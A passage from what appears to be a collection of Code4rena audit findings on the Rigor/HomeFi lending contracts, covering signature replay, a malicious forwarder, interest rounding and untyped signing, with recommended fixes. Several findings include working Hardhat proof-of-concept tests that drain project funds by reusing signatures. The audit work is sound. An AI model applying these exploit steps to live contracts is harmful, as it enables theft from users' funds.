setComplete() using the approveHash() method      const taskID = 1;     const _taskCost = 2 * taskCost;     const taskSC = signers[3];     let completeData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     const [encodedData, hash] = await encodeDataAndHash(completeData);     await mockDAIContract.mock.transfer       .withArgs(taskSC.address, _taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), _taskCost / 1e3)       .returns(true);      ({data} = await project.populateTransaction.approveHash(hash));     let contractor = await project.contractor();     let {subcontractor} = await project.getTask(taskID);     let builder = await project.builder();      await executeMetaTX(contractor, project.address, data as string);     await executeMetaTX(subcontractor, project.address, data as string);     await executeMetaTX(builder, project.address, data as string);           tx = await project.setComplete(encodedData, \"0x\");     await tx.wait();      await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      const { state } = await project.getTask(taskID);     expect(state).to.equal(3);     const getAlerts = await project.getAlerts(taskID);     expect(getAlerts[0]).to.equal(true);     expect(getAlerts[1]).to.equal(true);     expect(getAlerts[2]).to.equal(true);     expect(await project.lastAllocatedChangeOrderTask()).to.equal(0);     expect(await project.changeOrderedTask()).to.deep.equal([]);      async function executeMetaTX(from: string, to: string, data: string ) {       const gasLimit = await ethers.provider.estimateGas({         to,         from,         data,       });       const message = {         from,         to,         value: 0,         gas: gasLimit.toNumber(),         nonce: 0,         data,       };        // @ts-ignore       let tx = await maliciousForwarder.execute(message, \"0x\");       return tx;     }   });   // ----------------------------------------------------- // // Added to ethersHelpers.ts file: export function encodeDataAndHash(   data: any): string[] {   const encodedData = encodeData(data);   const encodedMsgHash = ethers.utils.keccak256(encodedData);   return [encodedData, encodedMsgHash]; } ```  ## Recommended Mitigation Steps  * Limit `approveHash` to contracts only - I understood from the sponsor that it is used for contracts to sign hashes. So limiting it to contracts only can help prevent stealing funds (from projects that are held by EOA) in case that the forwarder has been compromised (this is effective also in case there's some bug in the forwarder contract).     * Alternately, you can also make it use `msg.sender` instead of `_msgSender()`, this will also have a similar effect (it will allow also EOA to use the function, but not via forwarder).          * The advantage is that not only it wouldn't cost more than now, it'll even save gas.          * Another advantage is that it will also protect projects held by contracts from being impersonated by a malicious forwarder  * Make the process of replacing the forwarder or the admin a 2 step process with a delay between the steps (except for disabling the forwarder, in case the forwarder was hacked). This will give the admin the option to take steps to stop the attack, or at least give the users time to withdraw their money.   ```solidity     /// @inheritdoc IHomeFi     function replaceAdmin(address _newAdmin)         external         override         onlyAdmin         nonZero(_newAdmin)         noChange(admin, _newAdmin)     {         // Replace admin         pendingAdmin = _newAdmin;          adminReplacementTime = block.timestamp + 1 days;         emit AdminReplaceProposed(_newAdmin);     }          /// @inheritdoc IHomeFi     function executeReplaceAdmin()         external         override         onlyAdmin      {         require(adminReplacementTime > 0 && block.timestamp > adminReplacementTime, \"HomeFi::adminReplacmantTime\");         // Replace admin         admin = pendingAdmin;          emit AdminReplaced(_newAdmin);     }     /// @inheritdoc IHomeFi     function setTrustedForwarder(address _newForwarder)         external         override         onlyAdmin         noChange(trustedForwarder, _newForwarder)     {         // allow disabling the forwarder immediately in case it has been hacked         if(_newForwarder == address(0)){             trustedForwarder = _newForwarder;         }         forwarderSetTime = block.timestamp + 3 days;         pendingTrustedForwarder = _newForwarder;     }      function executeSetTrustedForwarder(address _newForwarder)         external         override         onlyAdmin     {         require(forwarderSetTime > 0 &&  block.timestamp > forwarderSetTime, \"HomeFi::forwarderSetTime\");         trustedForwarder = pendingTrustedForwarder;     }  ```  * Consider removing the meta tx for `HomeFi` `onlyAdmin` modifier (i.e. usg `msg.sender` instead of `_msgSender()`), given that it's not going to be used that often it may be worth giving up the comfort for hardening security "}, {"title": "In Project.setComplete(), the signature can be reused when the first call is reverted for some reason.", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/263", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330   # Vulnerability details  ## Impact `setComplete()` function might be called successfully using the past signature when it shouldn't work.  As a result, a task might be completed when a builder doesn't want it.   ## Proof of Concept [approveHash() function](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) can set only true so there is no method to cancel already approved hash without [passing validation here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L891).  So the below scenario would be possible.  - A builder, GC, and SC started a task and SC finished the task. - They are approved to complete the task and signed the signature. - But right before to call [setComplete()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330) using the signature, the SC felt the cost is too low and raised a dispute to change the order using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - As I suggested with another medium issue, the task can't be completed when there is an ongoing dispute from [this document - \"If there is no ongoing dispute about that project, task status is updated and payment is made.\"](https://github.com/code-423n4/2022-08-rigor#tasks-completion-and-payment). So `setComplete()` might revert. - Even if it doesn't check active disputes as now, `setComplete()` might revert when the funds haven't been allocated and a builder signed by fault. - After that, the HomeFi admin accepted the dispute, and the cost of the task was increased as SC wanted. - Then the builder would hope to get more results (or scores) from this task as the cost is increased rather than completed right away. - But SC can call `setComplete()` using the previous signature and complete the task without additional work. - A builder might know about that before and try to update task hash but it will revert because SC doesn't agree to [updateTaskHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L283). - In this case, it's logical to cancel the approved hash [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) but there is no such option.   I don't know if there would be similar problems with other functions that use signature and I think it would reduce the risk a little if we add an option to cancel the approved hash.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend modifying [approveHash()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L108) like below.  ``` function approveHash(bytes32 _hash, bool _bool) external override { //++++++++++++++++++++     address _sender = _msgSender();     // Allowing anyone to sign, as its hard to add restrictions here.     // Store _hash as signed for sender.     approvedHashes[_sender][_hash] = _bool; //+++++++++++++++++++      emit ApproveHash(_hash, _sender, _bool); //++++++++++++++++++++++ } ```  I am not so sure that a similar scenario would be possible in the [Community contract](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L501) also and recommend to change both functions together."}, {"title": "Project.checkPrecision() is passing 0 cost.", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/253", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L903 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L253 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L417   # Vulnerability details  ## Impact The task of zero cost is useless and there would be no subcontractors to accept such task as no payment after finish.  So if such task is added by mistake, it would require more time and effort to finish because builder must complete it by himself to recover tokens.   ## Proof of Concept It will work properly when _amount = 0.  ``` function checkPrecision(uint256 _amount) internal pure {      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         \"Project::Precision>=1000\"     ); } ```  ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps Recommend changing like below.   ``` function checkPrecision(uint256 _amount) internal pure {      require(_amount > 0, \"zero amount\");      // Divide and multiply amount with 1000 should be equal to amount.     // This ensures the amount is not too precise.     require(         ((_amount / 1000) * 1000) == _amount,         \"Project::Precision>=1000\"     ); } ```"}, {"title": "Project.addTasks() wouldn't work properly when it's called from disputes contract.", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/233", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238   # Vulnerability details  ## Impact `addTasks()` function checks [this require()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) to make sure `_taskCount` is correct.  But it might revert when this function is called after a dispute because it takes a certain time to resolve disputes and other tasks might be added meanwhile.   ## Proof of Concept The below scenario would be possible.  - A project contains 10 active tasks(taskCount = 10) and a builder and contractor are going to add one more task. - There were some disagreements between a builder and contractor so they raised a dispute with _taskCount = 10 using [raiseDispute()](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493). - Normally it would take a certain time(like 1 day or more) to resolve the dispute as it must be done by HomeFi owner. - Meanwhile, if the builder and contractor need to add another task, they should set `_taskCount = 10` and `taskCount` will be 11 after addition [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L260). - After that, the HomeFi admin agreed to add a task with `_taskCount = 10`, but it will revert [here](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238).  So currently, the project builder and contractor shouldn't add new tasks to make their previous dispute valid.  I think it's reasonable to modify that they can add other tasks even though there is an active dispute.   ## Tools Used Solidity Visual Developer of VSCode   ## Recommended Mitigation Steps I think we can modify not to compare [taskCount](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) when it's called from disputes contract.  So we can modify [this part](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L238) like below.   ``` if (_msgSender() != disputes) {     require(_taskCount == taskCount, \"Project::!taskCount\"); } else {     _taskCount = taskCount; } ```"}, {"title": "Builder can halve the interest paid to a community owner due to arithmetic rounding", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/180", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L685-L686   # Vulnerability details  ## Impact Due to arithmetic rounding in `returnToLender()`, a builder can halve the APR paid to a community owner by paying every 1.9999 days. This allows a builder to drastically decrease the amount of interest paid to a community owner, which in turn allows them to advertise very high APR rates to secure funding, most of which they will not pay.  This issue occurs in the calculation of `noOfDays` in `returnToLender()` which calculates the number of days since interest has last been calculated. If a builder repays a very small amount of tokens every 1.9999 days, then the `noOfDays` will be rounded down to `1 days` however `lastTimestamp` is updated to the current timestamp anyway, so the builder essentially accumulates only 1 day of interest after 2 days.  I believe this is high severity because a community owner can have a drastic decrease in interest gained from a loan which counts as lost rewards. Additionally, this problem does not require a malicious builder because if a builder pays at a wrong time, the loaner receives less interest anyway.  ## Proof of Concept 1. A community owner provides a loan of 500_000 tokens to a builder with an APR of 10% (ignoring treasury fees) 2. Therefore, the community owner will expect an interest of 136.9 tokens per day (273.9 per 2 days) 3. A builder repays 0.000001 tokens at `lastTimestamp + 2*86400 - 1` 4. `noOfDays` rounds down to 1 thereby accumulating `500_000 * 100 * 1 / 365000 = 136` tokens for 2 days 5. Therefore, the community owner only receives 5% APR with negligible expenses for the builder ## Tools Used VS Code ## Recommended Mitigation Steps There are two possible mitigations: 1. Add a scalar to `noOfDays` so that any rounding which occurs is negligible i.e. ```solidity         uint256 _noOfDays = (block.timestamp -             _communityProject.lastTimestamp) * SCALAR / 86400; // 24*60*60           /// Interest formula = (principal * APR * days) / (365 * 1000)         // prettier-ignore         uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 _noOfDays /                 365000 /                 SCALAR; ``` 2. Remove the `noOfDays` calculation and calculate interest in one equation which reduces arithmetic rounding ```solidity uint256 _unclaimedInterest =                  _lentAmount *                 _communities[_communityID].projectDetails[_project].apr *                 (block.timestamp -             _communityProject.lastTimestamp) /                 365000 /                 86400; ``` "}, {"title": "Signature Checks could be passed when SignatureDecoder.recoverKey() returns 0", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L887 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Project.sol#L108-L115   # Vulnerability details  ## Impact It is possible to pass Signature Validity check with an SignatureDecoder.recoverKey() returns 0 whenever the builder and /or contractor have an existing approved hash for a data.  With occurrence of above, any user can call changeOrder or setComplete functions successfully after  user approves data hashes.   ## Tools Used Manual review  ## Recommended Mitigation Steps There should be a require check for `_recoveredSignature != 0` in checkSignatureValidity()"}, {"title": "Builder can call `Community.escrow` again to reduce debt further using same signatures", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/161", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L509   # Vulnerability details  ## Impact  Since there is no nonce in the data decoded at the beginning of function `escrow`, a builder can call the function multiple times reducing their debt as much as they wish.  ## Proof of Concept  - A builder has a debt of $50,000 - A lender, a builder, and an escrow agent all ~~enter a bar~~ sign a message that will reduce the debt of the builder by $5,000, upon receipt of physical cash. - Function `escrow` is called and debt is reduced to $45,000. - The builder, using the same `_data` and `_signature` then calls `escrow` a further 9 times reducing their debt to zero.  ## Recommended Mitigation Steps  1. Similar to function `publishProject`, add a new field into the [ProjectDetails](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/interfaces/ICommunity.sol#L19-L32) struct called `escrowNonce`.  2. Modify function `escrow` to check this nonce and update it after the debt has been reduced.  See the diff below for full changes.  ```diff diff --git a/contracts/Community.sol b/contracts/Community.sol index 1585670..b834d0e 100644 --- a/contracts/Community.sol +++ b/contracts/Community.sol @@ -15,7 +15,7 @@ import {SignatureDecoder} from \"./libraries/SignatureDecoder.sol\";   /**   * @title Community Contract for HomeFi v2.5.0 - +   * @notice Module for coordinating lending groups on HomeFi protocol   */  contract Community is @@ -520,10 +520,11 @@ contract Community is              address _agent,              address _project,              uint256 _repayAmount, +            uint256 _escrowNonce,              bytes memory _details          ) = abi.decode(                  _data, -                (uint256, address, address, address, address, uint256, bytes) +                (uint256, address, address, address, address, uint256, uint256, bytes)              );           // Compute hash from bytes @@ -540,6 +541,12 @@ contract Community is              _lender == _communities[_communityID].owner,              \"Community::!Owner\"          ); +        ProjectDetails storage _communityProject = +          _communities[_communityID].projectDetails[_project]; +        require( +            _escrowNonce == _communityProject.escrowNonce, +            \"Community::invalid escrowNonce\" +        );           // check signatures          checkSignatureValidity(_lender, _hash, _signature, 0); // must be lender @@ -548,6 +555,7 @@ contract Community is           // Internal call to reduce debt          _reduceDebt(_communityID, _project, _repayAmount, _details); +        _communityProject.escrowNonce = _communityProject.escrowNonce + 1;          emit DebtReducedByEscrow(_agent);      }  diff --git a/contracts/interfaces/ICommunity.sol b/contracts/interfaces/ICommunity.sol index c45bbf0..652f51c 100644 --- a/contracts/interfaces/ICommunity.sol +++ b/contracts/interfaces/ICommunity.sol @@ -29,6 +29,7 @@ interface ICommunity {          uint256 lentAmount; // current principal lent to project (needs to be repaid by project's builder)          uint256 interest; // total accrued interest on `lentAmount`          uint256 lastTimestamp; // timestamp when last lending / repayment was made +        uint256 escrowNonce; // signing nonce to use when reducing debt by escrow      } ```"}, {"title": "Project funds can be drained by reusing signatures, in some cases", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/95", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L490 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L330-L359 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L153-L164   # Vulnerability details   This attack path is the results of signatures reusing in 2 functions - `changeOrder()` and `setComplete()`, and a missing modifier at `Tasks.unApprove()` library function.  ## Impact  ### Draining the project from funds  Current or previous subcontractor of a task can drain the project out of its funds by running `setComplete()` multiple times.  This can be exploited in 3 scenarios: * The price of a task was changed to a price higher than available funds (i.e. `totalLent - _totalAllocated`, and therefore gets unapproved), and than changed back to the original price (or any price that's not higher than available funds) * The subcontractor for a task was changed via `changeOrder` and then changed back to the original subcontractor      * e.g. - Bob was the original SC, it was changed to Alice, and then back to Bob * Similar to the case above, but even if the current SC is different from the original SC - it can still work if the current and previous SCs are teaming up to run the attack      * e.g. Bob was the original SC, it was changed to Alice, and changed again to Eve. And now Alice and Eve are teaming up to drain funds from the project  After `setComplete()` ran once by the legitimate users (i.e. signed by contractor, SC and builder), the attackers can now run it multiple times: * Reuse signatures to run `changeOrder()` - changing SC or setting the price to higher than available funds     * The only signer that might change is the subcontractor, he's either teaming up with the attacker (scenario #3) or he was the SC when it was first called (scenario #2) * In case of price change:     * change it back to the original price via `changeOrder()`, reusing signatures     * Run `allocateFunds()` to mark it as funded again * SC runs `acceptInvite()` to mark task as active * Run `setComplete()` reusing signatures     * If SC has changed - replace his signature with the current one (current SC should be one of the attackers) * Repeat till the project runs out of funds  ### Changing tasks costs/subcontractor by external users This can also be used by external users (you don't need to be builder/GC/SC in order to run `changeOrder()`) to troll the system (This still requires the task to be changed at least twice, otherwise re-running `changeOrder()` with the same data would have no effect).  * Changing the task cost up or down, getting the SC paid a different amount than intended (if it goes unnoticed, or front-run the `setComplete()` function) * Unapproving a task by setting a different SC or a price higher than available funds     * The legitimate users can change it back, but the attacker can change it again, both sides playing around till someone gets tired :)   ## Proof of Concept  Since the tests depend on each other, the PoC tests were created by adding them to the file `test/utils/projectTests.ts`, after the function `it('should be able to complete a task'` ( [Line 1143](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1143) ).  In the first test - a subcontractor is changed and then changed back. In the second scenario a price is changed to the new price (that is higher than the total available funds, and therefore is unapproved) and then back to its original price (it can actually be any price that is not higher than the available funds). In both cases I'm demonstrating how the project can be drained out of fund,   ```typescript    type DataType = {     types: string[];     values: (string | number)[];   };    it('PoC change SC', async () => {        const taskID = 1;     let taskDetails = await project.getTask(taskID);     const scBob = taskDetails.subcontractor;     const scAliceSigner = signers[4];     console.log({ scBob, alice: scAliceSigner.address });     const newCost = taskCost; // same as old     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToAliceData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scAliceSigner.address, newCost, project.address],     };     const changeToAliceSignedData = await signData(changeToAliceData);      await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      const changeToBobData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, scBob, newCost, project.address],     };     const changeToBobSignedData = await signData(changeToBobData);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);      const bobSigner = getSignerByAddress(signers, scBob);     await (await project.connect(bobSigner).acceptInviteSC([taskID])).wait();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(scAliceSigner.address, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(scBob, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();      // the only thing that has changed is that alice became a subcontractor     // IRL Alice can simply take the old signatures and replace Bob's signature     // with her own signature     let aliceSetCompleteSignedData = await signData(setCompleteData);       tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeSC(changeToBobSignedData[0], changeToBobSignedData[1]);     await changeSC(changeToAliceSignedData[0], changeToAliceSignedData[1]);      await (await project.connect(scAliceSigner).acceptInviteSC([taskID])).wait();          tx = await project.setComplete(setCompleteSignedData[0], aliceSetCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);           async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeSC(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });     it('PoC change cost', async () => {     const taskID = 1;     let taskDetails = await project.getTask(taskID);     const originalSC = taskDetails.subcontractor;     const originalCost = taskCost;      const veryHighNewCost = taskCost * 10;     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToNewData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, veryHighNewCost, project.address],     };     const changeToNewSignedData = await signData(changeToNewData);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);      const changeBackToOldData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, originalCost, project.address],     };     const changeBackToOldSignedData = await signData(changeBackToOldData);      await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);     taskDetails = await project.getTask(taskID);      await expect(taskDetails.cost).to.be.equal(originalCost);      const originalSCSigner = getSignerByAddress(signers, originalSC);     await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(originalSC, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();        tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);          async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeCost(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       // await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });  ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps  * Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse * Add the `onlyActive()` modifier to `Tasks.unApprove()` * Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)"}, {"title": "Hash approval not possible when contractor == subcontractor", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/86", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L859   # Vulnerability details  ## Impact & Proof Of Concept When a contractor (let's say Bob) is also a subcontractor (which can be a valid scenario), it is not possible to use the hash approval feature for `checkSignatureTask`. The first call to `checkSignatureValidity` will already delete `approvedHashes[address(Bob)][_hash]`, the second call therefore fails.  Note that the same situation would also be possible for builder == contractor, or builder == subcontractor, although those situations are probably less likely to occur.  ## Recommended Mitigation Steps Delete the approval only when all checks are done."}, {"title": "Wrong APR can be used when project is unpublished and published again ", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/83", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "edited-by-warden", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L267   # Vulnerability details  ## Impact When a project is unpublished from a community, it can still owe money to this community (on which it needs to pay interest according to the specified APR). However, when the project is later published again in this community, the APR can be overwritten and the overwritten APR is used for the calculation of the interest for the old project (when it was unpublished).  ## Proof Of Concept 1.) Project A is published in community I with an APR of 3%. The community lends 1,000,000 USD to the project. 2.) Project A is unpublished, the `lentAmount` is still 1,000,000 USD. 3.) During one year, no calls to `repayLender`, `reduceDebt`, or `escrow` happens, i.e. the interest is never added and the `lastTimestamp` not updated. 4.) After one year, the project is published again in the same community. Because the FED raised interest rates, it is specified that the APR should be 5% from now on. 5.) Another $1,000,000 is lent to the project by calling `lendToProject`. Now, `claimInterest` is called which calculates the interest of the last year for the first million. However, the function already uses the new APR of 5%, meaning the added interest is 50,000 USD instead of the correct 30,000 USD.   ## Recommended Mitigation Steps When publishing a project, if the `lentAmount` for the community is non-zero, calculate the interest before updating the APR."}, {"title": "Untyped data signing", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/75", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L175 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L213 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L530 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Disputes.sol#L91 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L142 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L167 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L235 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L286 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L346 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L499   # Vulnerability details  ## Impact & Proof Of Concepts In many places of the project (see affected code), untyped application data is directly hashed and signed. This is strongly disencouraged, as it enables different attacks (that each could be considered their own issue / vulnerability, but I submitted it as one, as they have all the same root cause):  1.) Signature reuse across different Rigor projects: While some signature contain the project address, not all do. For instance, `updateProjectHash` only contains a `_hash` and a `_nonce`. Therefore, we can have the following scenario: Bob is the owner of project A and signs / submit `updateProjectHash` with nonce 0 and some hash. Then, a project B that also has Bob as the owner is created. Attacker Charlie can simply take the `_data` and `_signature` that Bob previously submitted to project A and send it to project B. As this project will have a nonce of 0 (fresh created), it will accept it. `updateTaskHash` is also affected by this. 2.) Signature reuse across different chains: Because the chain ID is not included in the data, all signatures are also valid when the project is launched on a 